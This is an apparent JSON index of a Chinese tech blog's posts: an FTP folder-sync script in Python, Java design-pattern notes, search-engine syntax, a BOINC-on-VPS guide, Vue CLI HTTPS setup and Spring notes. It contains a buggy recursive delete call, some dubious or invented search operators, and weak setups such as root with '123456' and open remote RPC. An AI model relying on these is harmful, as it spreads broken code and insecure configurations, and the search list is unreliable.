[{"title":"Python简单实现文件同步","url":"/2025/02/01/python简单文件同步/","content":"\n### main.py\n\n```python\nimport time\nimport os\nimport ftputil\nimport config\nfrom ftputil import FTPHost\nfrom watchdog.observers import Observer\nfrom watchdog.events import FileSystemEventHandler\n\n# 指定要监控的目录\npath_to_monitor = \"D:\\\\workspace\\\\filesync\"\n\nclass CustomFileHandler(FileSystemEventHandler):\n    def on_any_event(self,event):\n        \n        ##如果是移动操作(修改文件 文件夹名称) 则取修改后的路径\n        relative_path = os.path.relpath(event.dest_path,path_to_monitor).replace('\\\\','/') if event.event_type == 'moved' else os.path.relpath(event.src_path,path_to_monitor).replace('\\\\','/')\n        with FTPHost(config.host, config.user, config.password) as host:\n\n            def delete_dir_recursively(directory,ftp):\n                    # 获取目录中的文件和子目录列表\n                    files_and_dirs = ftp.listdir(directory)\n                    \n                    for item in files_and_dirs:\n                        full_path = ftp.path.join(directory, item)\n                        \n                        # 如果是文件，则删除\n                        if ftp.path.isfile(full_path):\n                            ftp.remove(full_path)\n                            print(f\"Deleted file: {full_path}\")\n                        # 如果是目录，则递归删除\n                        elif ftp.path.isdir(full_path):\n                            delete_dir_recursively(full_path)\n                            # 在递归删除子目录后，删除空目录本身\n                            ftp.rmdir(full_path)\n                            print(f\"Deleted directory: {full_path}\")\n                    ftp.rmdir(directory)\n\n            if event.is_directory == False:  ##如果是文件\n                try:\n                    ####上一级目录\n                    directory = os.path.dirname(relative_path)\n                    # fullfile = os.path.join(directory,os.path.basename(relative_path))\n                    if event.event_type == 'created' or event.event_type == 'modified':   ##新增或修改情况 将文件进行覆盖上传\n                        if directory:\n                            # 确保远程目录存在\n                            host.makedirs(directory, exist_ok=True)\n                        host.upload(relative_path, relative_path)\n                    \n                    if event.event_type == 'deleted':   ##如果是删除文件\n                        try:\n                            host.remove(relative_path)\n                        except ftputil.error.PermanentError as e:\n                            if relative_path:\n                                delete_dir_recursively(relative_path,host)\n\n                    ## 如果是修改文件名称\n                    if event.event_type == 'moved':\n                        src = os.path.relpath(event.src_path,path_to_monitor).replace('\\\\','/')\n                        host.rename(src,relative_path)\n                except ftputil.error.PermanentError as e:\n                   pass\n\n            if event.is_directory == True:   ##如果是目录(文件夹)\n                if relative_path:\n                    ###创建\n                    try:\n                        if event.event_type == 'created':\n                            host.makedirs(relative_path, exist_ok=True)\n                        ###删除\n                        if event.event_type == 'deleted':\n                            #host.rmtree(relative_path,ignore_errors=True)\n                            delete_dir_recursively(relative_path,host)\n                        ###修改\n                        if event.event_type == 'moved':\n                            src = os.path.relpath(event.src_path,path_to_monitor).replace('\\\\','/')\n                            host.rename(src,relative_path)\n                    except ftputil.error.PermanentError as e:\n                        pass\n\n\n\n\nif __name__ == \"__main__\":\n    # 创建事件处理器\n    event_handler = CustomFileHandler()\n    # 创建观察者并设置事件处理器\n    observer = Observer()\n    observer.schedule(event_handler, path=path_to_monitor, recursive=True)\n    # 启动观察者\n    observer.start()\n    try:\n        # 保持脚本运行，以便持续监控\n        while True:\n            time.sleep(1)\n    except KeyboardInterrupt:\n        # 当用户按下 Ctrl+C 时退出\n        observer.stop()\n    # 等待观察者线程终止\n    observer.join()\n\n\n    \n```\n\n### config.py\n\n```python\nhost='xx.xx.xx.xx'\nuser='root'\npassword='123456'\n```\n\n导出三方库\n\n```shell\npip freeze > requirements.txt\n```\n\n### requirements.txt\n\n```python\nftputil==5.1.0\nwatchdog==6.0.0\n```\n\n\n\n","tags":["python"]},{"title":"设计模式(部分)","url":"/2025/01/12/设计模式(部分)/","content":"\n## 开闭原则\n\n对于一个类来说，我们如果想增加它的功能，无非就两种方式，要么修改这个类要么扩展这个类。而开闭原则就是指导我们在对一个类升级的时候如何在这两者之间取舍。\n\n**概念定义**：程序对于扩展是开放的，对于修改是封闭的。\n\n**解释**：鼓励我们对于已经有的且比较稳定的代码，尽量不要改动，而是创建子类通过重写父类的部分逻辑来实现新的行为。\n\n\n\n\n\n## 单例模式\n\n### 概念定义\n\n确保一个类只有一个实例，而且自行实例化并向整个系统提供这个实例。（全局唯一）\n\n根据实例的的初始化时间分为饿汉式与懒汉式。\n\n饿汉式：即在类加载的时候就进行实例化。(**线程安全**)\n\n懒汉式：即不在类加载时候进行实例化，而是在第一次使用的时候进行实例化。（**存在线程风险**）\n\n示例：饿汉式\n\n```java\n//饿汉式\nclass Singleton{\n\tprivate static Singleton singleton = new Singleton();\n\n\tprivate Singleton(){}\n\tpublic static Singleton getIntstance(){\n\t\treturn singleton;\n\t}\n}\npublic class Main {\n\tpublic static void main(String[] args) {\n\t   Singleton singleton = Singleton.getIntstance();\n\t   Singleton singleton2 = Singleton.getIntstance();\n\t   System.out.println(singleton==singleton2);   \n\t}\n}\n```\n\n示例：懒汉式\n\n```java\nclass Singleton{\n\tprivate static Singleton singleton;\n\t\n\tprivate Singleton(){}\n\tpublic synchronized static Singleton getIntstance(){\n\t\tif(singleton == null){\n\t\t\tsingleton = new Singleton();\n\t\t}\n        return singleton;\n\t}\n}\n```\n\n加锁的目的是为了防止被多次实例化，那么为什么会出现多次实例化的情况呢，我们假设有A，B两个线程同时获取实例对象，而此时的实例对象还没有被实例化，那么A，B两个线程就会同时执行到**if判断**，也就会同时new两个Singleton对象。\n\n**双重检查锁**：\n\n前面我们可以看到，synchronized是加在整个方法上的，无论是第一次实例化对象还是后续对象的获取，都会进入到同步块中。但是我们真正需要同步的只有第一次实例化对象的时候，也就是说其实只有if语句里的内容才需要同步。\n\n```java\nclass Singleton{\n\tprivate volatile static Singleton singleton;\n\t\n\tprivate Singleton(){}\n\tpublic static Singleton getIntstance(){\n\t\tif(singleton == null){\n\t\t\tsynchronized (Singleton.class) {\n\t\t\t\tif(singleton == null){\n\t\t\t\t\tsingleton = new Singleton();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn singleton;\n\t}\n}\n```\n\n使用双重检查锁进行初始化的实例必须使用**volatile**关键字进行修饰。\n\n原因：\n\nsingleton = new Singleton(); 语句的执行可以拆解为3步：\n\n1：分配内存\n\n2：初始化对象\n\n3：指向刚分配的内存\n\n由于cpu的优化，可能导致指令1，2，3的执行顺序进行重排序。\n\n假设A线程执行了1，3 还没有执行 2，B线程来到了判断NULL，B线程就会直接返回还没有初始化的intstance。volatile关键字可避免重排序\n\n**注意**：单例模式在以下情况会出现多个实例\n\n1：分布式系统，会有多个jvm虚拟机，每个jvm虚拟机都有一个实例。\n\n2：同一个jvm虚拟机中的多个类加载器同时加载这个类，产生了多个实例。\n\n单例模式最佳实践是无状态的，一般以工具类的方式进行提供。\n\n### \n\n\n\n\n\n## 简单工厂模式\n\n### 概念定义\n\n属于创建型模式，又叫做静态工厂方法，在简单工厂模式中，可以根据参数的不同而返回不同的实例对象。简单工厂模式专门定义了一个类来负责创建其他类的实例，被创建的实例通常具有相同的父类。\n\n示例：\n\n```java\n//抽象产品类\nabstract class Product{\n    abstract void print();\n}\n\nclass ProductA extends  Product{\n    @Override\n    void print() {\n        System.out.println(\"产品A\");\n    }\n}\n\nclass ProductB extends  Product{\n    @Override\n    void print() {\n        System.out.println(\"产品B\");\n    }\n}\n\n//工厂类\nclass SimpleFactory{\n    public static Product createP(String type){\n        if(type.equals(\"A\")){\n            return new ProductA();\n        }else{\n            return new ProductB();\n        }\n    }\n}\n```\n\n理解：根据传入不同的参数，返回不同类型的实例对象。\n\n优点：实现对象的创建和使用分离。\n\n缺点：如果要新增一个产品的话，就得修改工厂类的内部逻辑。如果产品特别多的话，这个逻辑就会非常复杂。\n\n### JDK中的简单工厂模式\n\n例如抽象类DateFormat，（get）\n\n### \n\n\n\n\n\n## 工厂模式\n\n在简单工程模式当中，最核心的工厂类需要指导产品的实例化具体细节，并且决定何时实例化哪一种产品类。而在工厂模式当中，之前的核心工厂变成了一个抽象接口，它负责给出工厂应该要实现的方法，但不负责产品的创建，而是将产品的创建交给子类去完成。\n\n为什么要这么麻烦，又是抽象类，又是子类的，而不是去直接修改工厂类呢？ 原因也是因为开闭原则。\n\n### 概念定义\n\n定义一个用于创建对象的接口，让子类决定实例化哪个类。工厂方法使一个类的实例化延迟到其子类。\n\n示例：\n\n```java\n//抽象工厂\nabstract class Factory{\n    abstract Produce createP();\n}\n\n//抽象产品\nabstract class Produce{\n    abstract void print();\n}\n\n//具体的产品A\nclass ProduceA extends Produce{\n    @Override\n    void print() {\n        System.out.println(\"产品A\");\n    }\n}\n//具体的产品B\nclass ProduceB extends Produce{\n    @Override\n    void print() {\n        System.out.println(\"产品B\");\n    }\n}\n\n//具体的工厂A\nclass FacotryA extends Factory{\n    @Override\n    public Produce createP() {\n        return new ProduceA();\n    }\n}\n//具体的工厂B\nclass FacotryB extends Factory{\n    @Override\n    public Produce createP() {\n        return new ProduceB();\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        Produce p = new FacotryA().createP();\n        p.print();\n        Produce p1 = new FacotryB().createP();\n        p1.print();\n    }\n}\n```\n\n\n\n### JDK中的工厂模式\n\nCollection集合：\n\nCollection接口就是我们刚才说的抽象工厂，Iterator是抽象产品接口，真正负责生产产品的其实是LinkedList和ArrayList这两个具体的工厂，而根据工厂的不同，生产不同的迭代器对象，LinkedList就负责生产ListItr迭代器对象，ArrayList就负责生产Itr迭代器对象。\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304231419750.png)\n\n\n\n## 模板模式\n\n### 概念定义\n\n定义一个操作中的算法的框架，而将一些步骤延迟到子类当中。使得子类可以不改变算法的结构即可重新定义该算法的某些特定步骤。\n\n情景：\n\n现在有一个新人，想学习做菜，于是去请教本地的一位名厨。老师傅就告诉新人，他是按照这些步骤进行做菜的，但是不同的菜具体的做法不同。由于是要做菜，所以必须按照这个模板来，但是具体的实现由新人自己负责。  \t\n\n![做菜](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304221703385.png)\n\n示例：\n\n```java\n//做菜模板\nabstract class  Cooking{\n\tprotected abstract void step1();\n\tprotected abstract void step2();\n\tpublic void cook(){\n\t\tSystem.out.println(\"开始做饭\");\n\t\tthis.step1();\n\t\tthis.step2();\n\t\tSystem.out.println(\"做饭结束\");\n\t}\n}\n//做菜具体实现\nclass CookFood extends Cooking{\n\t@Override\n\tprotected void step1() {\n\t\tSystem.out.println(\"放入西红柿和鸡蛋\");\n\t}\n\t@Override\n\tprotected void step2() {\n\t\tSystem.out.println(\"少放盐多放味精\");\n\t}\n}\n\npublic class Test {\n\tpublic static void main(String[] args) {\n\t\tCooking cooking = new CookFood();\n\t\tcooking.cook();\n\t}\n}\n```\n\n![模板类图](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304221717703.png)\n\n### 适应场景\n\n一次性实现一个算法的不变的部分，将可变的行为留给子类实现\n\n### JDK中的模板方法\n\n我们在写代码的时候经常会用到Comparator比较器来对集合对象进行排序，我们一般会实现他的**compare**方法，之后就可以通过Collections.sort() 或者 Arrays.sort() 方法进行排序了。\n\n再例如：Spring中的**JdbcTemplate**也使用了模板模式\n\n示例：\n\n```java\nArrayList<Integer> list = new ArrayList<>();\nfor(int i=0;i<10;i++){\n    list.add(new Random().nextInt(50));\n}\n\nCollections.sort(list,new Comparator<Integer>() {\n    @Override\n    public int compare(Integer o1, Integer o2) {\n        return o1-o2;\n    }\n});\n\nlist.forEach(e->{\n    System.out.println(e);\n});\t\n```\n\n### 理解\n\n由抽象类（父类）制定做某件事的**骨架**（模板）,抽象类只需要考虑做这件事有哪些步骤，不需要考虑步骤具体的内容是怎么样的，而流程中的步骤的具体**实施**交给子类完成，同样，子类也无需关心整件事的步骤有哪些，只需要关心当前手中的步骤的具体实现。\n\n\n\n## 装饰器模式\n\n### 概念定义\n\n是指在不改变原有对象的基础之上，将功能附加到对象上，提供了比继承更有弹性的替代方案(扩展原有对象的功能)，属于结构型模式。装饰器模式的核心是功能扩展，使用装饰器模式可以透明且动态地扩展类的功能。\n\n情景：\n\n假设我们买了一个机器人，这个机器人可以唱，rap，但是不会跳和打篮球。那么我现在想让他有跳和打篮球的功能，于是我们联系到厂家，厂家说目前是第一代的产品，需要等到第二代产品升级的时候，才会在原有的设计上添加跳，打篮球的功能。但是如果我们是一个手工牛人，认为不用等待厂家制作第二代机器人，自己就可以对机器人进行升级，那么我们需要怎么做呢。我们直接给机器人装上了一个箱子，然后再箱子的外面加上一对胳膊和一双腿，这样子也拥有了同样的功能。就可以不需要等待厂家的重新设计研发，而是可以很灵活的扩展想要的功能。\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304221734622.png)\n\n这两种方式：\n\n第一种称为类继承机制，就是继承一个现有的类，然后在子类里面进行扩展功能。\n\n第二种称为关联机制，就是把一个类的对象嵌入到另一个类的对象当中，类似于把机器人嵌入到箱子里，给他套上一层壳子来扩展功能，那么这层壳子也叫装饰器，第二种方式也成为装饰器模式。\n\n**区别：**\n\n第一种方式是静态的，一定要写一个新的子类，在类层级进行扩展。\n\n第二种方式是动态的，我们只要拿到一个对象就可以对其进行扩展，不需要修改原有的类逻辑。就增加功能而言，装饰模式比生成子类更为灵活。\n\n示例：\n\n```java\n//机器人接口\ninterface Robot{\n\tvoid doSomething();\n}\n//第一代机器人\nclass FirstRobot implements Robot{\n\t@Override\n\tpublic void doSomething() {\n\t\tSystem.out.println(\"唱歌\");\n\t\tSystem.out.println(\"rap\");\n\t}\n}\n//装饰器\nclass RobotDecorator implements Robot{\n\tprivate Robot robot;\n\tpublic RobotDecorator(Robot robot){\n\t\tthis.robot = robot;\n\t}\n\t@Override\n\tpublic void doSomething() {\n\t\trobot.doSomething();\n\t}\n\tpublic void doMorething(){\n\t\trobot.doSomething();\n\t\tSystem.out.println(\"跳舞\");\n\t\tSystem.out.println(\"打篮球\");\n\t}\n}\npublic class Test {\n\tpublic static void main(String[] args) {\n\t\tnew RobotDecorator(new FirstRobot()).doMorething();\n\t}\n}\n```\n\n### JDK中的装饰模式\n\n在刚才的例子中我们不难发现，使用的时候，new装饰器，把原先的对象放进去就行了，这种方式是否有些熟悉，我们在使用输入输出流的时候经常用到。没错，Java的IO流也使用了大量的装饰器模式，\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304221828698.png)\n\n\n\n## 代理模式\n\n### 概念定义\n\n为其他对象提供一种代理以控制对这个对象的访问。\n\n情景：\n\n由于一些众所周知的原因，大家知道在国内我们是无法直接访问到谷歌的，但是可以通过某些代理软件连接到谷歌。那么代理软件做了一件什么事情呢？首先呢这个软件有一个海外的服务器，这个服务器去访问到谷歌（充当代理人的角色），拿到想要的页面，然后再把页面发送到我们的设备上。我们虽然不能直接访问谷歌的服务器，但是可以访问这个代理人。\n\n再比如开发当中，远程调用的时候接口在我们这边，但是实现类（即具体的逻辑部分）是在另一台服务器上，这个时候在本地可以有一个代理类，它用于建立网络的连接，远程调用另一个服务器的实现类，最后返回实现结果。\n\n类图;\n\n<img src=\"https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304231824311.png\" style=\"zoom:150%;\" />\n\n\n\n作用：\n\n例如在调用真正的目标类之前可以先建立网络的连接，IO的连接，日志记录或者一些结果解析。\n\n示例：\n\n```java\n/*\n* 代理模式\n* */\nclass ProxyPattern{}\n//目标类代理类接口\ninterface Subject{\n    void doWork();\n}\n//实际的目标类\nclass RealSubject implements Subject{\n    @Override\n    public void doWork() {\n        System.out.println(\"Hello Proxy\");\n    }\n}\n//实际的代理类\nclass RealProxy implements Subject{\n    private RealSubject realSubject;\n    public RealProxy(){\n        try{\n            this.realSubject = (RealSubject) this.getClass().getClassLoader().loadClass(\"Demo.RealSubject\").newInstance();\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n    public void connect(){\n        System.out.println(\"建立连接\");\n    }\n    public void log(){\n        System.out.println(\"记录日志\");\n    }\n    @Override\n    public void doWork() {\n        connect();\n        realSubject.doWork();\n        log();\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        new RealProxy().doWork();\n    }\n}\n```\n\n代理模式与装饰器模式的区别：\n\n代理模式关注的是：你必须通过我们代理类去访问目标对象，代理对象就是控制目标对象的访问的。\n\n装饰器模式：更侧重的是动态的给一些对象添加原本没有的功能。\n\n\n\n\n\n","tags":["设计模式"]},{"title":"搜索引擎语法","url":"/2025/01/12/搜索引擎语法/","content":"\n1. **基本搜索：** 输入关键词即可进行基本搜索。\n   - 示例：`Python programming`\n2. **引号：** 使用引号将词组括起来，以确保搜索结果包含完整的短语。\n   - 示例：`\"machine learning\"`\n3. **排除词：** 使用减号 `-` 来排除特定词汇。\n   - 示例：`Linux -Ubuntu`\n4. **或操作：** 使用 `OR` 或 `|` 来执行逻辑“或”操作。\n   - 示例：`Python OR Java` 或 `Python | Java`\n5. **站点限制：** 使用 `site:` 来限制搜索结果为特定网站。\n   - 示例：`site:wikipedia.org Python`\n6. **文件类型：** 使用 `filetype:` 来限制搜索结果为特定文件类型。\n   - 示例：`filetype:pdf machine learning`\n7. **相关性运算符：** 使用 `related:` 查找与特定网站相关的其他网站。\n   - 示例：`related:github.com`\n8. **通配符：** 使用 `*` 作为通配符，表示缺少的单词。\n   - 示例：`improve * skills`\n9. **范围搜索：** 使用 `..` 表示一个数字范围。\n   - 示例：`Python 3..5`\n10. **定义搜索：** 使用 `define:` 查找特定词的定义。\n\n- 示例：`define:serendipity`\n\n1. **关键词附近搜索：** 使用 `AROUND(n)` 查找两个关键词之间大约有 n 个词的页面。\n\n- 示例：`machine learning AROUND(5) algorithms`\n\n1. **时间范围：** 使用工具提供的时间过滤器或使用 `before:` 和 `after:` 来限制搜索结果的时间范围。\n\n- 示例：`Python programming before:2022`\n\n\n\n### 图片搜索语法：\n\n1. **搜索特定类型的图片：**\n   - 示例：`sunrise filetype:jpg`\n2. **搜索高分辨率图片：**\n   - 示例：`high resolution mountain scenery`\n3. **搜索特定颜色的图片：**\n   - 示例：`red rose color:blue`\n4. **搜索图片的来源：**\n   - 示例：`source:National Geographic`\n5. **搜索相似的图片：**\n   - 示例：`similar:example-image.jpg`\n6. **指定宽度为2K的图片：**\n   - 示例：`width:2048 pixels`\n7. **指定水平和垂直分辨率为2K的图片：**\n   - 示例：`dimensions:2048x1080`\n8. **限制高分辨率图片：**\n   - 示例：`high resolution dimensions:1920x1080`\n\n### 文件搜索语法：\n\n1. **搜索特定类型的文件：**\n   - 示例：`filetype:pdf Python tutorial`\n2. **搜索特定文件名：**\n   - 示例：`intitle:\"annual report\" filetype:doc`\n3. **搜索特定文件扩展名：**\n   - 示例：`ext:csv population data`\n4. **搜索特定文件大小：**\n   - 示例：`size:>10MB`\n5. **搜索文件的创建或修改时间：**\n   - 示例：`filetype:pdf modified:2022`","tags":["搜索引擎"]},{"title":"利用闲置Vps搭建BOINC公益项目","url":"/2025/01/12/利用闲置Vps搭建BOINC公益项目/","content":"\n# 什么是Boinc ?\n\nBOINC 是 Berkeley Open Infrastructure for Network Computing 的首字母缩写，即伯克利开放式网络计算平台，是用于志愿计算和网格计算的开放的中间件系统。\n\nBOINC 最早是为了支持 SETI@home 项目而开发的，之后逐渐成了最为主流的分布式计算平台，为众多的数学、物理、化学、生命科学、地球科学等学科类别的项目所使用。BOINC 的开发目的是为了帮助研究人员更方便地获得分布在世界各地的志愿者的计算资源。\n\n![Logo](https://yinli.me/wp-content/uploads/2020/03/2020032614262345-1024x428.png)\n\n# 云服务器安装BOINC客户端\n\n​\t使用 xshell 连接服务器（也可以使用Putty） 执行安装命令\n\n```shell\nyum install boinc-client\n```\n\n​\t或者\n\n```shell\napt-get install boinc-client\n```\n\n# 配置远程管理\n\n​\t安装完成后开始配置远程管理，方便我们在电脑本地连接服务器查看项目进度 在root目录下新建文件 `cc_config.xml`\n\n```shell\nvi /root/cc_config.xml \n```\n\n​\t按 i 进入编辑模式，输入以下内容后按 esc 退出，按： 输入wq 保存文本\n\n```xml\n<cc_config>\n   <options>\n      <ncpus>-1</ncpus>\n         <allow_remote_gui_rpc>1</allow_remote_gui_rpc>\n   </options>\n</cc_config>\n```\n\n​\t新建 `gui_rpc_auth.cfg` 文件，设置远程管理密码\n\n​\t设置密码，内容为空则密码为空，保存。\n\n```\n123456\n```\n\n​\t开放TCP31416端口（腾讯云或阿里云直接在安全组上将此端口开放）\n\n测试运行 BIONC 项目\n\n```shell\nboinc\n```\n\n执行后会有一堆运行信息。如果显示有“Config: GUI RPC allowed from any host”，那么就应该配置成功了。 ctrl + c 退出 ，输入reboot重启服务器。\n\n以后运行的时候用命令（现在先执行一遍，服务器重启后需要重新执行）\n\n```shell\nboinc --daemon\n```\n\n# 本地安装BOINC客户端\n\n​\t[下载地址](https://boinc.berkeley.edu/download.php)：https://boinc.berkeley.edu/download.php\n\n然后打开运行 BOINC Manager ，切换到高级视图\n\n![高级视图](https://www.yinli.me/wp-content/uploads/2020/03/2020032615184484.png)\n\n点击菜单的文件－选择计算机 输入服务器 IP ，然后输入刚才设置的密码，等待连接\n\n![输入](https://yinli.me/wp-content/uploads/2020/03/2020032615204230.png)\n\n连接成功后，就可以选择要参加的项目\n\n# 建议\n\n​\t强烈建议修改计算机参数设置，cpu 占用不要太高，不然有可能被 vps 厂商封号\n\n![修改cpu限制](https://www.yinli.me/wp-content/uploads/2020/03/2020032615274714.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Vps","Boinc"]},{"title":"Vue-cli本地项目搭建https环境","url":"/2025/01/12/Vue-cli本地项目搭建https环境/","content":"\n[让Vue CLI支持HTTPS_口袋の的天空的博客-CSDN博客](https://blog.csdn.net/qq_39928481/article/details/118896033)【搬运的】\n\n## 1.打开git黑窗口\n\n命令行定位到这个目录，然后敲3个命令，其中第二个命令会问你N个问题，不用回答，一律回车即可：\n\n```shell\nopenssl genrsa -out privatekey.pem 1024\nopenssl req -new -key privatekey.pem -out certrequest.csr\nopenssl x509 -req -in certrequest.csr -signkey privatekey.pem -out certificate.pem\n--- 然后build文件夹下就会增加这个cert文件夹，cert文件夹会有3个文件\n```\n\n![](https://img-blog.csdnimg.cn/20210719145322995.png)\n\n## 2.打开webpack.dev.conf.js文件，配置vue.config.js\n\n![](https://img-blog.csdnimg.cn/20210719145445398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5OTI4NDgx,size_16,color_FFFFFF,t_70)\n\n## 1)添加https和fs\n\n![](https://img-blog.csdnimg.cn/20210719145638211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5OTI4NDgx,size_16,color_FFFFFF,t_70)\n\n## 2)添加https配置\n\n![](https://img-blog.csdnimg.cn/20210719145659216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5OTI4NDgx,size_16,color_FFFFFF,t_70)\n\n```shell\n/*---------添加以下2句，引入https和fs---------*/\nconst https = require('https')\nconst fs = require('fs')\n/*---------添加以上2句，引入https和fs---------*/\n```\n\n```shell\n /*---------添加https配置---------*/\n    https: {\n      key: fs.readFileSync(path.join(__dirname, './cert/privatekey.pem')),\n      cert: fs.readFileSync(path.join(__dirname, './cert/certificate.pem'))\n    }\n    /*---------添加https配置---------*/\n————————————————\n```\n\n### 注\n\nvue3项目中,devServer配置在**vue-config.js**文件中，同时还要引入**path**模块。\n\n","tags":["Vue","https"]},{"title":"Spring笔记(未完成)","url":"/2025/01/12/Spring笔记/","content":"\n# Spring\n\n## IOC控制反转\n\n​\t概念：实例对象原本的控制权在类，反转后将实例对象的控制权给IOC容器，着重体现在对象的创建上\n\n### IOC案例\n\n①导入依赖 SpringIOC相关依赖\n\n```xml\n<dependency>\n\t<groupId>org.springframework</groupId>\n    <artifactId>spring-context</artifactId><version>5.1.9.RELEASE</version>\n</dependency>\n```\n\n②在**resources**文件夹下创建Spring xml配置文件，命名最好为**applicationContext.xml**，xml文件用于bean的配置\n\n![项目结构](https://cdn.jsdelivr.net/gh/muouren7/PIC/img202211131611506.png)\n\n​\t假如项目中包含以上类文件，enity中的Student为实体类，dao下的StudentDaoImp为StudentDao接口的实现。以将StudentDaoImp注册为bean为例，可以在xml配置文件中这样写\n\n③xml中bean配置的写法\n\n​\t其中、class为全类名，id可以任意起，但bean与bean之间id不能重复，id是在Context（上下文、容器）创建对应类的实例对象时需要。\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n    <bean class=\"dao.Imp.StudentDaoImmp\" id=\"StudentDao\"></bean>\n</beans>\n```\n\n④对象的创建\n\n​\t在mian方法中或测试方法中写入一下代码\n\n​\t容器对象创建的实例对象为**object**类，需要将其强制转换为目标类（使用接口转换）\n\n```java\n    public static void main(String[] args){\n                ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n                StudentDao studentDao = (StudentDao) applicationContext.getBean(\"StudentDao\");\n    }\n```\n\n### Bean常用属性\n\n+ **id**：bean的唯一标识\n+ **class**：全类名，用于反射创建对象\n+ **scope**：scope属性有**singleton**和**prototype**两个值，前者IOC容器只会实例化一个bean对象，默认在容器创建时创建对象，后者创建多个对象，每次调用getBean都会创建一个新对象。\n\n## DI依赖注入\n\n​\t概念：IOC控制反转应用的一种场景，反转的是对象依赖关系的维护权。（可以理解为IOC实例化目标对象，DI注入实例化目标对象里的属性对象）\n\n### Set方法注入\n\n​\t必须有对应属性的set方法\n\n​\t使用**property**标签，name对应属性，value为要注入的值，ref为引用其他的bean\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n    <bean class=\"dao.Imp.StudentDaoImmp\" id=\"StudentDao\">\n        <property name=\"name\" value=\"张三\"></property>\n    </bean>\n</beans>\n```\n\n### 有参构造注入\n\n**\tconstructor-arg**比奥前标签用于指定构造函数的参数\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n    <bean class=\"enity.Student\" id=\"student\">\n        <constructor-arg name=\"id\" value=\"1\"></constructor-arg>\n        <constructor-arg name=\"name\" value=\"里斯\"></constructor-arg>\n    </bean>\n</beans>\n```\n\n### 复杂类型属性注入\n\n​\t**property**子标签，（包含list，set）等。\n\n## Lombok\n\n### 导入依赖\n\n```xml\n<dependency>\n    <groupId>org.projectlombok</groupId>\n    <artifactId>lombok</artifactId>\n    <version>1.18.18</version>\n</dependency>\n```\n\n## 配置文件\n\n### 读取properties文件\n\n​\t让Spring读取properties文件内容，再利用其中的键值对。\n\n①设置读取properties\n\n​\t在Spring bean配置文件里写\n\n​\t其中，location为properties位置，由于打包后资源文件会复制到target中，所有选择classpath:\n\n​\t另外，classpath:*properties *代表任意properties文件\n\n```xml\n<context:property-placeholder location=\"classpath:application.properties\"></context:property-placeholder>\n```\n\n②使用配置文件中的值\n\n​\t使用${key}的方式来表示具体的值，另外需要在value属性中使用才可以。\n\n​\tproperties文件内容\n\n```properties\nname=muouren7\n```\n\n```xml\n<constructor-arg name=\"name\" value=\"${name}\"></constructor-arg>\n<!--或者-->\n<property name=\"name\" value=\"${name}\"></property>\n```\n\n### 引入Spring xml配置文件\n\n​\t在主配置文件中通过import标签的resource属性，引入其他xml配置文件\n\n```xml\n<import resource=\"classpath:applicationContext-book.xml\" />\n```\n\n## 低频知识点\n\n### Bean相关配置\n\n* **name**属性：类似于id，用于bean的命名与标识\n\n* **lazy-init**：如果设置为true，则在第一次获取该对象时才会创建\n\n  ```xml\n  <bean class=\"com.xxx\" name=\"test\" lazy-init=\"true\"></bean>>\n  ```\n\n* **init-method**：指定初始化方法，容器在创建完对象后会自动调用，*配置的初始化方法只能是空参的*\n\n* **destroy-method**：指定销毁前方法，容器在销毁对象之前会调用\n\n* **factory-bean & factory-method**：\n\n  ```xml\n  <!--创建实例工厂-->\n  <bean class=\"com.sangeng.factory. CarFactory\"id=\"carFactory\"></bean>\n  <!--使用实例工)厂创建Car放入容器-->\n  <!--factory-bean用来指定使用哪个工厂对象-->\n  <bean factory-bean=\"carFactory\" factory-method=\"getcar\"</bean>\n  ```\n\n  ```xml\n  <!--使用静态工厂创建Car放入容器-->\n  <bean class=\" com.sangeng.factory.CarStaticFactory\" factory-method=\"getCar\"></bean>\n  ```\n# Spring注解开发\n\n  ## 注解开发\n\n### 开启组件扫描\n\n```xml\n<context:component-scan base-package=\"com.xxx\"/>\n```\n\n## IOC相关注解\n\n### @Component,@Controller,@Service,@Repository\n\n## DI相关注解\n\n### @Value\n\n​\t用于String Integer等类型的直接注入，不依赖setter方法，支持SpEL表达式（即**${表达式}**）\n\n### @AutoWired\n\n​\tSpring会自动给加了该注解的属性注入相同类型的对象\n\n### 